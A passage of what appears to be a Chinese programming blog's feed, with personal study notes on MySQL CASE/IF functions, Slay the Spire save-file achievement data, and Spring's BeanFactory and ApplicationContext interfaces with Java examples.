<td align="center">如果val1为true，返回res1，… 否则返回default默认值</td>
</tr>
<tr>
<td align="center">CASE [expr] WHEN [val1] THEN [res1] … ELSE [default] END</td>
<td align="center">如果expr的值等于val1，返回res1，… 否则返回default默认值</td>
</tr>
</tbody></table>
<p>实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 流程控制函数</span><br><span class="line">-- if</span><br><span class="line">select if(false, &#x27;Ok&#x27;, &#x27;Error&#x27;);</span><br><span class="line"></span><br><span class="line">-- ifnull</span><br><span class="line">select ifnull(&#x27;Ok&#x27;,&#x27;Default&#x27;);</span><br><span class="line"></span><br><span class="line">select ifnull(&#x27;&#x27;,&#x27;Default&#x27;);</span><br><span class="line"></span><br><span class="line">select ifnull(null,&#x27;Default&#x27;);</span><br><span class="line"></span><br><span class="line">-- case when then else end</span><br><span class="line">-- 需求: 查询emp表的员工姓名和工作地址 (北京/上海 ----&gt; 一线城市 , 其他 ----&gt; 二线城市)</span><br><span class="line">select</span><br><span class="line">    name,</span><br><span class="line">    ( case workaddress when &#x27;北京&#x27; then &#x27;一线城市&#x27; when &#x27;上海&#x27; then &#x27;一线城市&#x27; else &#x27;二线城市&#x27; end ) as &#x27;工作地址&#x27;</span><br><span class="line">from emp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 案例: 统计班级各个学员的成绩，展示的规则如下：</span><br><span class="line">-- &gt;= 85，展示优秀</span><br><span class="line">-- &gt;= 60，展示及格</span><br><span class="line">-- 否则，展示不及格</span><br><span class="line"></span><br><span class="line">create table score(</span><br><span class="line">    id int comment &#x27;ID&#x27;,</span><br><span class="line">    name varchar(20) comment &#x27;姓名&#x27;,</span><br><span class="line">    math int comment &#x27;数学&#x27;,</span><br><span class="line">    english int comment &#x27;英语&#x27;,</span><br><span class="line">    chinese int comment &#x27;语文&#x27;</span><br><span class="line">) comment &#x27;学员成绩表&#x27;;</span><br><span class="line">insert into score(id, name, math, english, chinese) VALUES (1, &#x27;Tom&#x27;, 67, 88, 95 ), (2, &#x27;Rose&#x27; , 23, 66, 90),(3, &#x27;Jack&#x27;, 56, 98, 76);</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">select</span><br><span class="line">    id,</span><br><span class="line">    name,</span><br><span class="line">    (case when math &gt;= 85 then &#x27;优秀&#x27; when math &gt;=60 then &#x27;及格&#x27; else &#x27;不及格&#x27; end ) &#x27;数学&#x27;,</span><br><span class="line">    (case when english &gt;= 85 then &#x27;优秀&#x27; when english &gt;=60 then &#x27;及格&#x27; else &#x27;不及格&#x27; end ) &#x27;英语&#x27;,</span><br><span class="line">    (case when chinese &gt;= 85 then &#x27;优秀&#x27; when chinese &gt;=60 then &#x27;及格&#x27; else &#x27;不及格&#x27; end ) &#x27;语文&#x27;</span><br><span class="line">from score;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>java</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>slay_the_spire</title>
    <url>/2023/04/16/slay-the-spire/</url>
    <content><![CDATA[<p><a href="https://tieba.baidu.com/p/7717284033">【图片】杀戮尖塔安卓与PC端存档文件简介_杀戮尖塔吧_百度贴吧 (baidu.com)</a></p>
<p>参考<a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=1541057&highlight=%C9%B1%C2%BE%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BDhttps://www.52pojie.cn/forum.php?mod=viewthread&tid=1541057&highlight=%C9%B1%C2%BE%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD">写一个杀戮尖塔存档修改器 - 『编程语言区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p><a href="https://www.bilibili.com/read/cv18587141/">杀戮尖塔(Slay the Spire)控制台指南（包括所有卡牌、遗物、药水、荒疫等中英对照） - 哔哩哔哩 (bilibili.com)</a></p>
<p><a href="https://sts.huijiwiki.com/wiki/%E6%88%90%E5%B0%B1">成就 - 杀戮尖塔&#x2F;尖塔奇兵（Slay the Spire）中文维基|攻略百科|考据资料|Steam - 灰机wiki (huijiwiki.com)</a></p>
<p><a href="https://www.bilibili.com/video/BV1PZ4y1v72F/?spm_id_from=333.788.recommend_more_video.-1&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">【杀戮尖塔】手机版资源获取（简介和评论区自取）_手机游戏热门视频 (bilibili.com)</a></p>
<p>开个坑，也算是学学代码。</p>
<p>直接全成就</p>
<span id="more"></span>

<h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><h3 id="整体结构分析"><a href="#整体结构分析" class="headerlink" title="整体结构分析"></a>整体结构分析</h3><p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230416113151438.png" alt="image-20230416113151438"></p>
<h4 id="preferences"><a href="#preferences" class="headerlink" title="preferences"></a>preferences</h4><p>steam_autocloud.vdf:存appid的没啥用</p>
<p>STSAchievements：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;GUARDIAN&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;GHOST_GUARDIAN&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ADRENALINE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;COME_AT_ME&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AUTOMATON&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PERFECT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;COLLECTOR&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SHAPES&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SAPPHIRE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ASCEND_0&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;TIME_EATER&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SLIME_BOSS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;POWERFUL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CHAMP&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;INFINITY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;YOU_ARE_NOTHING&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CROW&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AMETHYST&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RUBY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;THE_PACT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;IMPERVIOUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PLAGUE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CATALYST&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;EMERALD&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AMETHYST_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RUBY_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ASCEND_10&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;JAXXED&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SPEED_CLIMBER&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;TRANSIENT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;BARRICADED&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;EMERALD_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PURITY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;MINIMALIST&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ASCEND_20&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>存成就的（只有完成的才会在这里显示），之后测试下是否可以直接修改。达成全成就。</p>
<p>网上找到的，测试下能否直接全成就</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;LUCKY_DAY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ASCEND_0&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;IMPERVIOUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;BARRICADED&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;GHOST_GUARDIAN&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CHAMP&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CROW&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;EMERALD&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PERFECT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SLIME_BOSS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ADRENALINE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SHAPES&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SAPPHIRE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;COLLECTOR&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RUBY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;GUARDIAN&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RUBY_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;THE_PACT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PLAGUE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AUTOMATON&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;EMERALD_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;YOU_ARE_NOTHING&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;TIME_EATER&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;POWERFUL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SAPPHIRE_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;THE_ENDING&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;COME_AT_ME&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PURITY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;MINIMALIST&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;COMMON_SENSE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SHRUG_IT_OFF&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SPEED_CLIMBER&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ONE_RELIC&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;NEON&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;INFINITY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;FOCUSED&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;JAXXED&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;TRANSIENT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;DONUT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CATALYST&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;NINJA&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ASCEND_10&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="存档加密算法分析"><a href="#存档加密算法分析" class="headerlink" title="存档加密算法分析"></a>存档加密算法分析</h3><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h2 id="全成就快速完成攻略："><a href="#全成就快速完成攻略：" class="headerlink" title="全成就快速完成攻略："></a>全成就快速完成攻略：</h2><h3 id="Boss击杀"><a href="#Boss击杀" class="headerlink" title="Boss击杀"></a><strong>Boss击杀</strong></h3><p>守护者、亡魂、老大、第一勇士、收藏家、机械人偶、乌鸦、形状、时间吞噬者。</p>
<p>这些有手就行，多打几把基本都能完成。</p>
<h3 id="通关"><a href="#通关" class="headerlink" title="通关"></a>通关</h3><p>红宝石：</p>
<p>红宝石+：</p>
<p>绿宝石：</p>
<p>绿宝石+：</p>
<p>蓝宝石：</p>
<p>蓝宝石+：</p>
<p>结局：</p>
<p>紫水晶：</p>
<p>紫水晶+：</p>
<p>进阶0：</p>
<p>进阶10：</p>
<p>进阶20：</p>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>瘟疫：</p>
<p>耸肩无视：</p>
<p>契约：</p>
<p>肾上腺素：</p>
<p>纯净：</p>
<p>催化剂：</p>
<p>岿然不动：</p>
<p>岿然不动：</p>
<p>嗑药：</p>
<p>来打我啊：</p>
<p>强大：</p>
<p>无限：</p>
<p>忍者：</p>
<p>弱者为何要战斗：</p>
<p>哦！甜甜圈：</p>
<p>快速攀爬者：</p>
<p>极简主义者：</p>
<p>谁会需要遗物：</p>
<p>平常心：</p>
<p>集中：</p>
<p>霓虹：</p>
<p>今天是个好日子：</p>
<p>倏忽即逝：</p>
<p>永存者：</p>
]]></content>
      <tags>
        <tag>逆向</tag>
        <tag>java</tag>
        <tag>steam</tag>
      </tags>
  </entry>
  <entry>
    <title>spring 源码学习</title>
    <url>/2024/07/16/spring-%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>参考资料：</p>
<p><a href="https://www.bilibili.com/video/BV1P44y1N7QG/?spm_id_from=333.999.0.0&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">黑马程序员Spring视频教程，深度讲解spring5底层原理_哔哩哔哩_bilibili</a></p>
<p><a href="https://www.yuque.com/snailclimb/gepg7u">《Java必读源码系列》 (yuque.com)</a></p>
<span id="more"></span>

<h1 id="黑马程序员视频"><a href="#黑马程序员视频" class="headerlink" title="黑马程序员视频"></a>黑马程序员视频</h1><h2 id="1-容器接口"><a href="#1-容器接口" class="headerlink" title="1.容器接口"></a>1.容器接口</h2><p>ctrl + ALT + 单击 ：跳转到实现</p>
<ul>
<li><p>BeanFactory 接口，典型功能有：</p>
<ul>
<li>getBean</li>
</ul>
<p>对应代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">BeanFactory</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">FACTORY_BEAN_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    Object <span class="title function_">getBean</span><span class="params">(String name)</span> <span class="keyword">throws</span> BeansException;</span><br><span class="line"></span><br><span class="line">    &lt;T&gt; T <span class="title function_">getBean</span><span class="params">(String name, Class&lt;T&gt; requiredType)</span> <span class="keyword">throws</span> BeansException;</span><br><span class="line"></span><br><span class="line">    Object <span class="title function_">getBean</span><span class="params">(String name, Object... args)</span> <span class="keyword">throws</span> BeansException;</span><br><span class="line"></span><br><span class="line">    &lt;T&gt; T <span class="title function_">getBean</span><span class="params">(Class&lt;T&gt; requiredType)</span> <span class="keyword">throws</span> BeansException;</span><br><span class="line"></span><br><span class="line">    &lt;T&gt; T <span class="title function_">getBean</span><span class="params">(Class&lt;T&gt; requiredType, Object... args)</span> <span class="keyword">throws</span> BeansException;</span><br><span class="line"></span><br><span class="line">    &lt;T&gt; ObjectProvider&lt;T&gt; <span class="title function_">getBeanProvider</span><span class="params">(Class&lt;T&gt; requiredType)</span>;</span><br><span class="line"></span><br><span class="line">    &lt;T&gt; ObjectProvider&lt;T&gt; <span class="title function_">getBeanProvider</span><span class="params">(ResolvableType requiredType)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">containsBean</span><span class="params">(String name)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isSingleton</span><span class="params">(String name)</span> <span class="keyword">throws</span> NoSuchBeanDefinitionException;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isPrototype</span><span class="params">(String name)</span> <span class="keyword">throws</span> NoSuchBeanDefinitionException;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isTypeMatch</span><span class="params">(String name, ResolvableType typeToMatch)</span> <span class="keyword">throws</span> NoSuchBeanDefinitionException;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isTypeMatch</span><span class="params">(String name, Class&lt;?&gt; typeToMatch)</span> <span class="keyword">throws</span> NoSuchBeanDefinitionException;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    Class&lt;?&gt; getType(String name) <span class="keyword">throws</span> NoSuchBeanDefinitionException;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    Class&lt;?&gt; getType(String name, <span class="type">boolean</span> allowFactoryBeanInit) <span class="keyword">throws</span> NoSuchBeanDefinitionException;</span><br><span class="line"></span><br><span class="line">    String[] getAliases(String name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>DefaultListableBeanFactory 是 其实现类。看pop up发现<img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20240716185829687.png" alt="image-20240716185829687">有个</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20240716184505726.png" alt="image-20240716184505726"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DefaultSingletonBeanRegistry 里面有private final Map&lt;String, Object&gt; singletonObjects = new ConcurrentHashMap&lt;&gt;(256); 存的单例对象</span><br></pre></td></tr></table></figure></li>
</ul>
<p>具体查看单列对象代码(反射获取)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> SpringApplication.run(AlibabaStudyApplication.class, args);</span><br><span class="line"><span class="comment">//        context.getBean(&quot;aaa&quot;);</span></span><br><span class="line">        System.out.println(context);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">singletonObjects</span> <span class="operator">=</span> DefaultSingletonBeanRegistry.class.getDeclaredField(<span class="string">&quot;singletonObjects&quot;</span>);</span><br><span class="line">        singletonObjects.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ConfigurableListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> context.getBeanFactory();</span><br><span class="line">        Map&lt;String, Object&gt; map = (Map&lt;String, Object&gt;) singletonObjects.get(beanFactory);</span><br><span class="line">        map.forEach((k, v)-&gt;&#123;</span><br><span class="line">            System.out.println(k + <span class="string">&quot;=&quot;</span> + v);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





<ul>
<li><p>ApplicationContext 接口，是 BeanFactory 的子接口。它扩展了 BeanFactory 接口的功能，如：</p>
<ul>
<li>国际化</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> SpringApplication.run(AlibabaStudyApplication.class, args);</span><br><span class="line">    System.out.println(context.getMessage(<span class="string">&quot;hi&quot;</span>, <span class="literal">null</span>, Locale.CHINA));<span class="comment">//获取key 翻译后的结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>通配符方式获取一组 Resource 资源</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> SpringApplication.run(AlibabaStudyApplication.class, args);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> SpringApplication.run(AlibabaStudyApplication.class, args);</span><br><span class="line">        System.out.println(context.getEnvironment().getProperty(<span class="string">&quot;server.port&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">//8080 （需要在配置文件里面表示出来）</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="comment">//class path resource [application.preperties]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> SpringApplication.run(AlibabaStudyApplication.class, args);</span><br><span class="line">        Resource[] resources = context.getResources(<span class="string">&quot;classpath*:META-INF/spring.factories&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Resource resource : resources) &#123;</span><br><span class="line">            System.out.println(resource);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">URL [jar:file:/C:/Users/<span class="number">22536</span>/.m2/repository/org/springframework/boot/spring-boot/<span class="number">3.3</span><span class="number">.1</span>/spring-boot-<span class="number">3.3</span><span class="number">.1</span>.jar!/META-INF/spring.factories]</span><br><span class="line">URL [jar:file:/C:/Users/<span class="number">22536</span>/.m2/repository/org/springframework/boot/spring-boot-autoconfigure/<span class="number">3.3</span><span class="number">.1</span>/spring-boot-autoconfigure-<span class="number">3.3</span><span class="number">.1</span>.jar!/META-INF/spring.factories]</span><br><span class="line">URL [jar:file:/C:/Users/<span class="number">22536</span>/.m2/repository/org/springframework/spring-aop/<span class="number">6.1</span><span class="number">.10</span>/spring-aop-<span class="number">6.1</span><span class="number">.10</span>.jar!/META-INF/spring.factories]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"> </span><br></pre></td></tr></table></figure>



<ul>
<li>整合 Environment 环境（能通过它获取各种来源的配置信息）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> SpringApplication.run(AlibabaStudyApplication.class, args);</span><br><span class="line">        System.out.println(context.getEnvironment().getProperty(<span class="string">&quot;server.port&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//8080 （需要在配置文件里面表示出来）</span></span><br></pre></td></tr></table></figure>



<ul>
<li><p>事件发布与监听，实现组件之间的解耦</p>
